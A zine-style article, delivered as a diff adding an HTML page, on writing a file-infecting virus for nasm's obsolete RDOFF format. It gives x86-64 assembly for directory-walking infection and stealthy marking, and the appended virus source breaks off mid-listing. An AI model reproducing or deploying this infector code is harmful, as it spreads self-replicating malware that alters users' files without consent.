@@ -1,0 +1,1145 @@
+<html>
+<head>
+<title>REVIVING RDOFF PART 2: RDOFF VIRUS ~ netspooky</title>
+<meta charset="utf-8">
+<link href="./style.css" rel="stylesheet" type="text/css">
+<link rel="stylesheet" href="./highlight.min.css">
+<script src="./highlight.min.js"></script>
+<script src="./x86asm.min.js"></script>
+</head>
+<body>
+<div class="txtdiv">
+                                                       ┌───────────────────────┐
+                                                       ▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄       │
+                                                       │ █   █ █ █ █   █       │
+                                                       │ █   █ █ █ █▀▀▀▀       │
+                                                       │ █   █   █ █     ▄     │
+                                                       │                 ▄▄▄▄▄ │
+                                                       │                 █   █ │
+                                                       │                 █   █ │
+                                                       │                 █▄▄▄█ │
+                                                       │                 ▄   ▄ │
+                                                       │                 █   █ │
+                                                       │                 █   █ │
+                                                       │                 █▄▄▄█ │
+                                                       │                 ▄▄▄▄▄ │
+                                                       │                   █   │
+REVIVING RDOFF PART 2: RDOFF VIRUS                     │                   █   │
+~ netspooky                                            └───────────────────█ ──┘
+
+─── Intro ──────────────────────────────────────────────────────────────────\\──
+
+For BGGP6, I explored RDOFF [1], an obscure object file format originally used 
+to test object file generation in nasm. RDOFF v1 was first released as part of
+nasm 0.91 in 1997. RDOFF2 was added in late 2002, extending the features of the
+existing RDOFF implementation. The format's internal structures became load-
+bearing code for nasm's file generation pipeline, being re-worked any time a 
+change was needed for other output formats. (see part 1 for more info)
+
+RDOFF was removed from the nasm repos in nasm 2.16. The code that generated .rdf
+files hadn't worked properly in many years, despite being featured in the nasm
+help file, and other assemblers claiming compatibility for the format. I could
+not find a single example RDOFF file anywhere online, so I ended up writing 
+my own parser and generator in scapy[2].
+
+After patching nasm's rdx loader [3] and reviving RDOFF as an executable format,
+I started thinking about what could have been if this file format had ever seen
+wider usage.
+
+Much of what we write about in tmp.0ut involves sneaky ways of using ELF files. 
+ELF has had various security features rolled into it that platforms like Linux 
+support, along with a number of tools to explore ELF internals and runtime. The 
+ELF ecosystem has had time to cook over the years. RDOFF has not. In fact, the 
+file format is incomplete, with many of the advertised features never actually 
+being implemented.
+
+So with a deep understanding of an incomplete and obsolete file format that no 
+one cares about or uses, I decided to make an RDOFF virus. This virus does not 
+need a lot of bells and whistles. Due to the simplicity of the format, we can 
+use the simplest methods. Let's pretend it's 2002 [4] and create an evil RDOFF!
+
+
+─── Setup ──────────────────────────────────────────────────────────────────\\──
+
+All of this was tested on Ubuntu 22.04 for x86_64.
+
+[ Install required packages ]
+<pre><code class="language-sh">
+    sudo apt install autoconf automake build-essential binfmt-support
+</code></pre>
+
+[ Clone the repo and build ]
+<pre><code class="language-sh">
+    git clone -b nasm-2.15-rdoff-x64 https://github.com/netspooky/nasm
+    cd nasm
+    ./autogen.sh
+    ./configure
+    make everything
+</code></pre>
+
+[ Register the binfmt ]
+
+
+All you have to do is add your registration string to a configuration file in
+the /etc/binfmt.d/ directory. The path to the rdx interpreter should be changed
+to wherever you built nasm.
+
+<pre><code class="language-sh">
+    echo ":.rdf:M::RDOFF2::/home/user/nasm/rdoff/rdx:" > /etc/binfmt.d/rdf.conf
+</code></pre>
+
+NOTE: this is the syntax of a binfmt registration string
+
+<pre><code class="language-txt">
+    :name:type:offset:magic:mask:interpreter:flags
+</code></pre>
+
+[ Restart the binfmt service ]
+
+<pre><code class="language-sh">
+    sudo systemctl restart systemd-binfmt
+</code></pre>
+
+[ Confirm registration ]
+
+
+Check if the format was registered by examining /proc/sys/fs/binfmt_misc/.rdf
+
+<pre><code class="language-txt">
+    ▶ cat /proc/sys/fs/binfmt_misc/.rdf
+    enabled
+    interpreter /home/user/nasm/rdoff/rdx
+    flags: 
+    offset 0
+    magic 52444f464632
+</code></pre>
+
+[ Test a file ]
+
+
+Check if you can execute an RDOFF file. global.rdf from Part 1 should return the
+value of 6.
+
+<pre><code class="language-txt">
+    ▶ ./global.rdf ; echo $?
+    6
+</code></pre>
+
+
+─── RDOFF Structure ────────────────────────────────────────────────────────\\──
+
+This is the file structure of global.rdf
+
+┌─────────────────────────────────────────────────────────────────────────┐
+│00000000: 5244 4f46 4632 ────────────────────────── magic "RDOFF2"       │
+│                         4300 0000 ──────────────── obj_len: 67 bytes    │
+│                                   1400 0000 ────── hdr_len: 20 bytes    │
+├── Global Header ────────────────────────────────────────────────────────┤
+│                                             03 ─── hdr type: global     │
+│                                               0c ─ hdr len: 12          │
+│00000010: 00 ──────────────────────────────────────   flags: 0           │
+│            00 ────────────────────────────────────   segment: 0         │
+│               0000 0000 ──────────────────────────   offset: 0          │
+│                         5f6d 6169 6e00 ───────────   label "_main\0"    │
+├── BSS Header ───────────────────────────────────────────────────────────┤
+│                                        05 ──────── hdr type: bss        │
+│                                          04 ────── len: 4               │
+│                                             0100 ┬   bss_size: 1        │
+│00000020: 0000 ───────────────────────────────────┘                      │
+├── Text Segment ─────────────────────────────────────────────────────────┤
+│               0100 ─────────────────────────────── seg type: text       │
+│                    0000 ────────────────────────── seg number: 0        │
+│                         0000 ───────────────────── seg resrvd: 0        │
+│                              0c00 0000 ─────────── seg length: 12 bytes │
+│                                        b83c 0000 ┬ code                 │
+│00000030: 00bf 0600 0000 0f05 ────────────────────┘                      │
+├── Data Segment ─────────────────────────────────────────────────────────┤
+│                              0200 ──────────────── seg type: data       │
+│                                   0100 ─────────── seg number: 1        │
+│                                        0000 ────── seg resrvd: 0        │
+│                                             0100 ┬ seg length: 1 byte   │
+│00000040: 0000 ───────────────────────────────────┘                      │
+│               66 ───────────────────────────────── .bss data: "6"       │
+├─────────────────────────────────────────────────────────────────────────┤
+│                 00 0000 0000 0000 0000 00 ──────── Padding              │
+└─────────────────────────────────────────────────────────────────────────┘
+
+The general structure is:
+- RDOFF Magic
+- File Length
+- File Header
+  - Length
+    - Headers describing Global and BSS segments
+- Text Segment Header
+  - code
+- BSS Segment Header
+  - data
+
+As you can see, the file has a main header containing two subheaders that
+describe two segments, text and bss. These are the only two supported segment
+types in the rdx loader.
+
+Due to inconsistent naming, the subheader for the text segment is primarily 
+called the "global" section header. "global" is also called "extern" in some
+parts of the code, and "public" in others. All we really need to know is that 
+this header describes the offset of the text segment relative to the end of the
+RDOFF header, with a label "_main". The "_main" label is essentially a symbol 
+name for the beginning of the code, similar to "_start" in other code. The Text 
+segment this header points to has it's own header, containing the length and the
+segment number.
+
+The BSS header describes the BSS (aka "Data") segment, although without an
+explicit offset. The data segment is required by the loader, but unused by
+my programs. This segment contains the value of "6".
+
+
+The structure of having text and data segments is not unlike most executables 
+you see every day, like an ELF or a PE. The key difference is that the text
+segment has it's own small header immediately before the code starts. 
+
+
+─── Virus Ideation ─────────────────────────────────────────────────────────\\──
+
+To quote dnz: "how can we backdoor this?"
+
+As covered in part 1, the RDOFF parsers in nasm are quite How Ya Doin. Both the 
+code and the documentation for RDOFF describe a lot of features, but few are 
+implemented. Fewer still are components that were fully implemented, instead
+of boilerplate parsing and printing "Not supported yet". Most of the code hasn't 
+been touched since 2002, aside from style fixes and the renaming of libraries. 
+If we want to backdoor this file, we have to understand what actually matters to 
+the loader, and the tools built to parse rdoff.
+
+The first idea I had was to add an additional segment to the end of the file,
+which could be mapped adjacent to the _main text segment, preferably before it.
+This would require rewriting the file header to add a new text segment, and 
+adjusting the offset of the _main header to point to the virus code. The code
+would also need to preserve the original entrypoint and call that once finished.
+The loader would support this, but it would be a lot more work. 
+
+The simpler solution is to do a basic text infection. For this, all that would 
+be required is for the virus to insert itself at the start of the text section, 
+making sure that it cleans up before it continues to the rest of the code.
+
+What makes this approach even easier is that the global header describing the 
+_main text segment doesn't have a size specified, only an offset. This is unlike
+an ELF, where the program headers describe the sizes of the segment in the file 
+and in memory. The actual size is stored in the segment header, which is pointed
+to by the offset in the global header.
+
+This means that as long as the payload starts right at offset 0 in the text
+section (which is immediately after the headers end) then our payload should 
+fire before anything else. Then all we would need to do is just continue 
+execution into the main code.
+
+This approach would require us to update only a few fields
+- the file size after the rdoff header
+- the segment length field in the text segment header
+- something to mark if a file is infected
+
+Because there is absolutely no one else using RDOFF in any way, and the rdx 
+loader is already modified to work on x64, I decided to take the liberty to
+assume that any RDOFF is only ever going to have one text segment and one data 
+segment, and the header offsets will remain constant as a result. This should 
+make it much simpler to demonstrate the virus technique.
+
+
+─── Virus Logic ────────────────────────────────────────────────────────────\\──
+
+Lets take a second to think about what we need to do. 
+
+There are two length fields that need updating, which is easy. The other thing
+to figure out is how to mark a file to indicate that it's already infected.
+
+Generally, you want your marker to be sneaky. For an ELF, you should hide from
+fields commonly parsed by tools. This is why many viruses for ELF will use 
+the padding in the ELF header as a convenient place to store data without it
+appearing in the output of basic tools like readelf.
+
+There is only one tool to parse RDOFF files like readelf, and that is rdfdump,
+which comes with the nasm source.
+
+Example output for global.rdf:
+<pre><code class="language-txt">
+    ▶ rdfdump global.rdf 
+    RDOFF dump utility, version 2.3
+    RDOFF2 revision 0.6.1
+    Copyright (c) 1996,99 Julian R Hall
+    Improvements and fixes (c) 2002-2004 RET & COM Research.
+    File global.rdf: RDOFF version 2
+    
+    Object content size: 67 bytes
+    Header (20 bytes):
+      public: (0000:00000000) = _main
+      bss reservation: 00000001 bytes
+    
+    Segment:
+      Type   = 0001 (text)
+      Number = 0000
+      Resrvd = 0000
+      Length = 12 bytes
+    
+    Segment:
+      Type   = 0002 (data)
+      Number = 0001
+      Resrvd = 0000
+      Length = 1 bytes
+    
+    NULL segment
+    
+    Total number of segments: 2
+    Total segment content length: 13 bytes
+</code></pre>
+The first idea I had was to use Text Segment's Reservd field, since it's not
+used by anything. The downside is, this would show up in the output of rdfdump, 
+which is will alert an astute analyst---- wait a sec lol, what analyst???
+
+Even if no one is looking for these files, it is still prudent to use fields
+that are not visible to anyone using the stock tools. This is why I settled on
+using the global header flags field.
+
+This value "e.flags" is explicitly set[5] to 0 in rdf_relocate() when a segment
+gets mapped:
+
+<pre><code class="language-c">
+    case 3:                /* export record - add to symtab */
+        e.segment = r->e.segment;
+        e.offset = r->e.offset + (e.segment == 0 ? m->textrel :     /* 0 -> code */
+                                  e.segment == 1 ? m->datarel :     /* 1 -> data */
+                                  m->bssrel);       /* 2 -> bss  */
+        e.flags = 0; // <------ here is where it's set
+        e.name = nasm_malloc(strlen(r->e.label) + 1);
+        if (!e.name)
+            return 1;
+
+        strcpy(e.name, r->e.label);
+        symtabInsert(m->symtab, &e);
+        break;
+</code></pre>
+
+The segment flags are not included in the output of rdfdump, making it way more 
+stealthy. Note that the global header flags field is actually shown in my scapy 
+library using the .show() method:
+
+<pre><code class="language-txt">
+    ▶ python3 RDOFF.py 
+    ###[ RDOFF ]###
+     magic     = b'RDOFF2'
+     obj_len   = 64
+     hdr_len   = 17
+     \hdr       \
+      |###[ Header ]###
+      |  \hdr_records\
+      |   |###[ RDFHDR_TLVs ]###
+      |   |  type      = IMPORT
+      |   |  length    = 9
+      |   |  \value     \
+      |   |   |###[ RDFREC_IMPORT ]###
+      |   |   |  flags     = 0
+      |   |   |  segment   = 3
+      |   |   |  label     = b'_main'
+      |   |###[ RDFHDR_TLVs ]###
+      |   |  type      = BSS
+      |   |  length    = 4
+      |   |  \value     \
+      |   |   |###[ RDFREC_BSS ]###
+      |   |   |  bss_size  = 1
+     \segs      \
+      |###[ Header ]###
+      |  \rdf_segs  \
+      |   |###[ RDFHDR_TLVs ]###
+      |   |  type      = TEXT
+      |   |  number    = 0
+      |   |  resrvd    = 0
+      |   |  length    = 12
+      |   |  data      = b83c000000bf060000000f05
+      |   |###[ RDFHDR_TLVs ]###
+      |   |  type      = DATA
+      |   |  number    = 1
+      |   |  resrvd    = 0
+      |   |  length    = 1
+      |   |  data      = 00
+      |   |###[ RDFHDR_TLVs ]###
+      |   |  type      = NULL
+      |   |  number    = 0
+      |   |  resrvd    = 0
+      |   |  length    = 0
+      |   |  data      = 
+</code></pre>
+
+Now we have a map of the values the virus update to insert itself at the start
+of the host program:
+
+
+    ┌─ RDOFF ─────────┐            ┌─ Infected RDOFF ───────┐
+    │                 │            │                        │
+    │  obj_len ───────│── update ──│─>obj_len + VX_SIZE     │
+    │                 │            │                        │
+    │  global header  │            │  global header         │
+    │                 │            │                        │
+    │      flags = 0 ─│─── mark ───│─────>flags = 0x55      │
+    │                 │            │                        │
+    │  bss header     │            │  bss header            │
+    │                 │            │                        │
+    │  text segment   │            │  text segment          │
+    │                 │            │                        │
+    │      len  ──────│── update ──│─────>len + VX_SIZE     │
+    │                 │            │                        │
+    │      code       │  ┌── add ──│─────>VX_CODE           │
+    │                 │  │         │                        │
+    │  data segment   │  │         │      code              │
+    │                 │  │         │                        │
+    └─────────────────┘  │         │  data segment          │
+                         │         │                        │
+    VX_CODE ─────────────┘         └────────────────────────┘
+
+
+Let's implement this logic!
+
+
+─── Base File ──────────────────────────────────────────────────────────────\\──
+
+I decided to use nasm itself to generate the base file. Since nasm can't make
+an RDOFF file anymore, even with my patches, it seemed funny to use nasm to
+create a raw binary. The file structures can be crafted in the code, bypassing
+any pain in getting your bytes exactly where you need them. A bonus is that
+a nasm map file describing all the symbols in the code can be generated on
+each build, which is pretty handy for debugging.
+
+This was my basic code which creates various headers I need:
+
+<pre><code class="language-x86asm">
+[map all mybin.map]
+BITS 64
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+; RDOFF -----------------
+rdf_begin:
+  db "RDOFF2"                ; 0x00 magic
+
+obj_len: 
+  dd end_rdf - hdr           ; 0x06 obj_len
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+hdr:
+  dd 0x14                    ; 0x0A hdr_len
+
+global_header:
+  db 0x3                     ; 0x0E hdr_type: global
+  db 0xC                     ; 0x0F hdr_len: 12
+  db 0x55                    ; 0x10  flags: 0x55 = don't infect
+  db 0                       ; 0x11  segment: 0
+  dd 0                       ; 0x12  offset: 0
+  db "_main", 0              ; 0x16 label
+
+bss_header:
+  db 0x5                     ; 0x1C type: bss
+  db 0x4                     ; 0x1D len: 4
+  dd 1                       ; 0x1E bss_size: 1
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+seg_hdr_text: 
+  dw 1                       ; 0x22 seg_type: text
+  dw 0                       ; 0x24 seg_number: 0
+  dw 0                       ; 0x26 seg_resrvd: 0
+
+seg_code_size:  
+  dd seg_hdr_data - seg_code ; 0x28 seg_length: 12 bytes
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+</code></pre>
+
+From here, I needed to add my own code to iterate over files in the directory
+and infect them.
+
+
+─── Debugging ──────────────────────────────────────────────────────────────\\──
+
+Debugging this code is not as easy, as you need to account for the rdx loader
+which sets up the process image for the RDOFF file, then executes it.
+
+If you are following along using my repo and fork, then this should work just
+fine. Put this in a file called script.gdb
+<pre><code class="language-txt">
+break main
+start
+continue
+break 89
+continue
+break *0x40000000
+continue
+</code></pre>
+Then run rdx like this:
+<pre><code class="language-sh">
+    gdb -x script.gdb --args ~/nasm/rdoff/rdx test.rdf
+</code></pre>
+It should get you right to the start of the code in the RDOFF file.
+
+
+─── Adapting Linux.Nasty.asm ───────────────────────────────────────────────\\──
+
+The virus idea is pretty straight forward, and actually a lot easier than a
+virus targeting an ELF. It follows essentially the same path, but the file 
+structure will need to be adjusted for RDOFF.
+
+I was looking at old issues of tmp.0ut for inspiration for this virus and
+some logic I can reuse. I decided to reimplement the logic from TMZ's 
+Linux.Nasty.asm virus from 2020 [6]. It's an ELF infector that iterates over
+files in a directory, which is exactly what I need.
+
+What I love about this code is that it is very cleanly written and well 
+commented, and I know it works :) The main logic I didn't feel like writing 
+myself was the directory parsing code, so that was my starting point. 
+
+TMZ's original code was written for fasm, but since I am using nasm, there are
+some things to change to adapt it for my usage.
+
+Beyond removing the ELF specific pieces and adjusting how data gets referenced, 
+the main thing I needed to add was an RDOFF structure that I can use to 
+calculate the various offsets I need.
+
+This is the structure I added, with the fields to care about commented:
+
+<pre><code class="language-x86asm">
+    struc RDOFF
+        .magic             resb 6 
+        .obj_len           resd 1 ; update
+        .hdr_len           resd 1
+        .global_hdr_type   resb 1
+        .global_hdr_len    resb 1
+        .global_hdr_flags  resb 1 ; check
+        .global_hdr_seg    resb 1
+        .global_hdr_offset resd 1
+        .global_hdr_label  resb 6
+        .bss_hdr_type      resb 1
+        .bss_hdr_len       resb 1
+        .bss_hdr_bss_size  resd 1
+        .seg_txt_type      resw 1
+        .seg_txt_number    resw 1
+        .seg_txt_resrvd    resw 1
+        .seg_txt_length    resd 1 ; update
+    endstruc
+</code></pre>
+
+When you make a structure in nasm, it creates a variable you can use containing
+the total length of it. Here it is accessed as RDOFF_size, which is 0x2C.
+
+One the directory parsing code was added, the logic for parsing RDOFF and
+updating the fields was pretty simple:
+
+<pre><code class="language-x86asm">
+    .patch_rdoff_top:
+        add dword [r14 + RDOFF.obj_len], V_SIZE                 ;; update obj_len
+        mov byte [r14 + RDOFF.global_hdr_flags ], 0x55          ;; mark the file with 0x55 marker
+        add dword [r14 + RDOFF.seg_txt_length], V_SIZE          ;; update text segment len
+</code></pre>
+
+After the RDOFF header is updated, the next step is to copy the first 0x2C bytes
+of the buffer containing the original file, to the new file.
+
+<pre><code class="language-x86asm">
+    .copy_rdoff_top:
+        mov rdi, r13                                            ; target fd from r13
+        mov rsi, r14                                            ; mmap *buff from r14
+        mov rdx, RDOFF_size                                     ;; sizeof RDOFF header
+        mov rax, SYS_WRITE                                      ;; write patched RDOFF header to target host
+        syscall
+</code></pre>
+
+Once that is written, copy the virus body to the host. TMZ's code uses the call, 
+pop, sub trick to calculate the base address we need to find the start of the
+virus code. The size is known through the V_SIZE variable calculated by nasm
+at build time.
+
+<pre><code class="language-x86asm">
+    .write_virus_body:
+        call .delta                                             ; the age old trick
+        .delta:
+            pop rax
+            sub rax, .delta
+
+        mov rdi, r13                                            ; target temporary fd from r13
+        lea rsi, [rax + v_start]                                ; load *v_start
+        mov rdx, V_SIZE                                         ; virus body size
+        mov rax, SYS_WRITE
+        syscall
+</code></pre>
+
+With the virus code now copied to the start of the text segment, it's time to 
+copy the rest of the file, starting after the end of the RDOFF structure defined
+in the code at offset 0x2C. Once copied, a sync syscall commits the changes to 
+disk.
+
+<pre><code class="language-x86asm">
+    .write_everything_else:
+        mov rdi, r13
+        lea rsi, [r14 + RDOFF_size]                             ;; This should get us right to the start of the RDOFF code
+        mov rdx, [r15 + STAT.st_size]                           ; get size of host file from stack
+        sub rdx, RDOFF_size
+        mov rax, SYS_WRITE                                      ;; write rest of host file to temporary file
+        syscall
+ 
+        mov rax, SYS_SYNC                                       ; commiting filesystem caches to disk
+        syscall
+</code></pre>
+
+Now the RDOFF file is capable of infecting every RDOFF file in the current
+directory!
+
+Tests confirm that it works as expected!
+
+    ▶ ./example-program.rdf
+    This is an example program!
+    
+    ▶ ./virus.rdf 
+                         ▄▄▄  ▄ ────────────────────────────────────────────────────────────────────────
+                      ▄▄▄███  ▄ ────────────────────────────────────────────────────────────────────────
+                    ▄▄██████ ▄█ ────────────────────────────────────────────────────────────────────────
+     ▀█▄▄▄        ▄▄▀▀█████ ▄█▀ ────────────────────────────────────────────────────────────────────────
+      ▀███▀▀▄▄   ▀█ ▀▄█▀▀▀  █▀  ────────────────────────────────────────────────────────────────────────
+     ▄  ▀█▄▀ ▀▀    ▀▀▀▀  █▄██▀  ────────────────────────────────── greetings 2 the haunted computer club
+      ▀▄  ▀▀▀        ▄▄  ██ ▀   ┌──────┐┌──────┐┌──────┐┌──────┐┌──────┐┌──────┐┌──────┐┌      ┐┌      ┐
+        ▀▄▄  █▄  ██▄ █▀█▄██     │      ││      │       │└──────┐│      ││      ││      ││──────┘│      │
+          ▀█▄▀██▄██▀██ ▀▀█      │      ││──────┘       ││      ││──────┘│      ││      ││      │└──────│
+            ▀ ▀▀ ▀█  ▀   ▀      └     ─┘└──────┘       ┘└──────┘└       └──────┘└──────┘└      ┘└──────┘
+    
+    ▶ ./example-program.rdf
+                         ▄▄▄  ▄ ────────────────────────────────────────────────────────────────────────
+                      ▄▄▄███  ▄ ────────────────────────────────────────────────────────────────────────
+                    ▄▄██████ ▄█ ────────────────────────────────────────────────────────────────────────
+     ▀█▄▄▄        ▄▄▀▀█████ ▄█▀ ────────────────────────────────────────────────────────────────────────
+      ▀███▀▀▄▄   ▀█ ▀▄█▀▀▀  █▀  ────────────────────────────────────────────────────────────────────────
+     ▄  ▀█▄▀ ▀▀    ▀▀▀▀  █▄██▀  ────────────────────────────────── greetings 2 the haunted computer club
+      ▀▄  ▀▀▀        ▄▄  ██ ▀   ┌──────┐┌──────┐┌──────┐┌──────┐┌──────┐┌──────┐┌──────┐┌      ┐┌      ┐
+        ▀▄▄  █▄  ██▄ █▀█▄██     │      ││      │       │└──────┐│      ││      ││      ││──────┘│      │
+          ▀█▄▀██▄██▀██ ▀▀█      │      ││──────┘       ││      ││──────┘│      ││      ││      │└──────│
+            ▀ ▀▀ ▀█  ▀   ▀      └     ─┘└──────┘       ┘└──────┘└       └──────┘└──────┘└      ┘└──────┘
+    This is an example program!
+
+
+─── Conclusion ─────────────────────────────────────────────────────────────\\──
+
+That about wraps it up. I wanted to write a simple virus for RDOFF to showcase
+a simple technique to infect. 
+
+This file format is not really used by anyone anywhere, not even the creators! 
+The RDOFF files I created for BGGP6 are still the only examples of this format
+that I have seen anywhere online.
+
+This code is the only RDOFF virus that exists (I think). 
+
+I don't have any plans to maintain rdx or any of the RDOFF tools from nasm 2.15,
+but if this makes you excited, you should play with it yourself!
+
+Greetings 2: TMZ for writing beautiful code that stands the test of time, the 
+tmp.0ut crew and community, the binary golf community, haunted computer club, 
+everyone who loves 2 play with things no one else cares about KEEP EXPLORING!
+
+
+── REFS ────────────────────────────────────────────────────────────────────\\──
+
+[1] https://n0.lol/bggp6-rdoff/
+
+
+[2] https://github.com/netspooky/bggp6-spooky/blob/main/nasm/RDOFF.py
+
+
+[3] https://github.com/netspooky/nasm/tree/nasm-2.15-rdoff-x64/rdoff
+
+
+[4] https://youtu.be/ZwY4YPxTufs Heaven - DJ Sammy
+
+
+[5] https://github.com/netspooky/nasm/blob/nasm-2.15-rdoff-x64/rdoff/rdfload.c#L200
+
+
+[6] https://tmpout.sh/1/Linux.Nasty.asm
+
+
+── virus.asm ───────────────────────────────────────────────────────────────\\──
+<pre><code class="language-x86asm">
+[map all mybin.map]
+BITS 64
+
+; RDOFF Virus - netspooky 2026 - tmp.0ut 5
+; Adaptation of Linux.Nasty.asm for RDOFF
+; build: nasm -f bin rdoff-virus.asm -o rdoff-virus.rdf
+
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+; Constants
+
+SYS_CLOSE       equ 0x3
+SYS_CREAT       equ 0x55
+SYS_EXIT        equ 0x3c
+SYS_FSTAT       equ 0x5
+SYS_GETDENTS64  equ 0xd9
+SYS_MMAP        equ 0x9
+SYS_MUNMAP      equ 0xb
+SYS_OPEN        equ 0x2
+SYS_RENAME      equ 0x52
+SYS_SYNC        equ 0xa2
+SYS_WRITE       equ 0x1
+
+PROT_READ       equ 0x1
+PROT_WRITE      equ 0x2
+MAP_PRIVATE     equ 0x2
+MAP_PERMZ       equ PROT_READ | PROT_WRITE
+
+DT_REG          equ 0x8
+O_RDONLY        equ 0x0
+O_RDWR          equ 0x2
+STDOUT          equ 0x1
+DIRENT_BUFSIZE  equ 0x400
+
+V_SIZE          equ v_stop - v_start
+
+; Structures
+
+struc DIRENT 
+    .d_ino          resq 1
+    .d_off          resq 1
+    .d_reclen       resw 1
+    .d_type         resb 1
+    .d_name         resb 0
+endstruc
+
+
+struc STAT 
+    .st_dev         resq 1
+    .st_ino         resq 1
+    .st_nlink       resq 1
+    .st_mode        resd 1
+    .st_uid         resd 1
+    .st_gid         resd 1
+    .pad0           resb 4
+    .st_rdev        resq 1
+    .st_size        resq 1
+    .st_blksize     resq 1
+    .st_blocks      resq 1
+    .st_atime       resq 1
+    .st_atime_nsec  resq 1
+    .st_mtime       resq 1
+    .st_mtime_nsec  resq 1
+    .st_ctime       resq 1
+    .st_ctime_nsec  resq 1
+endstruc
+
+
+struc RDOFF
+    .magic             resb 6 
+    .obj_len           resd 1 ; update
+    .hdr_len           resd 1
+    .global_hdr_type   resb 1
+    .global_hdr_len    resb 1
+    .global_hdr_flags  resb 1 ; check
+    .global_hdr_seg    resb 1
+    .global_hdr_offset resd 1
+    .global_hdr_label  resb 6
+    .bss_hdr_type      resb 1
+    .bss_hdr_len       resb 1
+    .bss_hdr_bss_size  resd 1
+    .seg_txt_type      resw 1
+    .seg_txt_number    resw 1
+    .seg_txt_resrvd    resw 1
+    .seg_txt_length    resd 1 ; update
+endstruc
+
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+; RDOFF Structure
+;┌─────────────────────────────────────────────────────────────────────────┐
+;│00000000: 5244 4f46 4632 ────────────────────────── magic "RDOFF2"       │
+;│                         4300 0000 ──────────────── obj_len: 67 bytes    │ <<
+;│                                   1400 0000 ────── hdr_len: 20 bytes    │
+;├── Global Header ────────────────────────────────────────────────────────┤
+;│                                             03 ─── hdr type: global     │
+;│                                               0c ─ hdr len: 12          │
+;│00000010: 00 ──────────────────────────────────────   flags: 0           │ <<
+;│            00 ────────────────────────────────────   segment: 0         │
+;│               0000 0000 ──────────────────────────   offset: 0          │
+;│                         5f6d 6169 6e00 ───────────   label "_main\0"    │
+;├── BSS Header ───────────────────────────────────────────────────────────┤
+;│                                        05 ──────── hdr type: bss        │
+;│                                          04 ────── len: 4               │
+;│                                             0100 ┬   bss_size: 1        │
+;│00000020: 0000 ───────────────────────────────────┘                      │
+;├── Text Segment ─────────────────────────────────────────────────────────┤
+;│               0100 ─────────────────────────────── seg type: text       │
+;│                    0000 ────────────────────────── seg number: 0        │
+;│                         0000 ───────────────────── seg resrvd: 0        │
+;│                              0c00 0000 ─────────── seg length: 12 bytes │ <<
+;│                                        b83c 0000 ┬ code                 │ <<
+;│00000030: 00bf 0600 0000 0f05 ────────────────────┘                      │
+;├── Data Segment ─────────────────────────────────────────────────────────┤
+;│                              0200 ──────────────── seg type: data       │
+;│                                   0100 ─────────── seg number: 1        │
+;│                                        0000 ────── seg resrvd: 0        │
+;│                                             0100 ┬ seg length: 1 byte   │
+;│00000040: 0000 ───────────────────────────────────┘                      │
+;│               66 ───────────────────────────────── .bss data: "6"       │
+;├─────────────────────────────────────────────────────────────────────────┤
+;│                 00 0000 0000 0000 0000 00 ──────── Padding              │
+;└─────────────────────────────────────────────────────────────────────────┘
+
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+; RDOFF -----------------
+rdf_begin:
+  db "RDOFF2"                ; 0x00 magic
+
+obj_len: 
+  dd end_rdf - hdr           ; 0x06 obj_len
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+hdr:
+  dd 0x14                    ; 0x0A hdr_len
+
+global_header:
+  db 0x3                     ; 0x0E hdr_type: global
+  db 0xC                     ; 0x0F hdr_len: 12
+  db 0x55                    ; 0x10  flags: 0x55 = don't infect
+  db 0                       ; 0x11  segment: 0
+  dd 0                       ; 0x12  offset: 0
+  db "_main", 0              ; 0x16 label
+
+bss_header:
+  db 0x5                     ; 0x1C type: bss
+  db 0x4                     ; 0x1D len: 4
+  dd 1                       ; 0x1E bss_size: 1
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+seg_hdr_text: 
+  dw 1                       ; 0x22 seg_type: text
+  dw 0                       ; 0x24 seg_number: 0
+  dw 0                       ; 0x26 seg_resrvd: 0
+
+seg_code_size:  
+  dd seg_hdr_data - seg_code ; 0x28 seg_length: 12 bytes
+
+seg_code:  
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+v_start:
+    sub rsp, 2000                                               ; reserving 2000 bytes
+    mov r15, rsp                                                ; r15 has the reserved stack buffer address
+
+    load_dir:
+        push "."                                                ; pushing "." to stack (rsp)
+        mov rdi, rsp                                            ; moving "." to rdi
+        mov rsi, O_RDONLY
+        xor rdx, rdx                                            ; not using any flags
+        mov rax, SYS_OPEN
+        syscall                                                 ; rax contains the fd
+
+        mov r8, rax                                             ; mov fd to r8 temporarily
+
+        mov rdi, rax                                            ; move fd to rdi
+        lea rsi, [r15 + 600 + DIRENT]                           ; rsi = dirent in stack
+        mov rdx, DIRENT_BUFSIZE                                 ; buffer with maximum directory size
+        mov rax, SYS_GETDENTS64
+        syscall    
+        
+        mov r9, rax                                             ; r9 now contains the directory entries
+
+        mov rdi, r8                                             ; load open dir fd from r8
+        mov rax, SYS_CLOSE                                      ; close source fd in rdi
+        syscall
+
+        test r9, r9                                             ; check directory list was successful
+        js cleanup                                              ; if negative code is returned, I failed and should exit
+
+        mov qword [r15 + 500], r9                               ; [r15 + 500] now holds directory size
+        xor rcx, rcx                                            ; will be the position in the directory entries
+
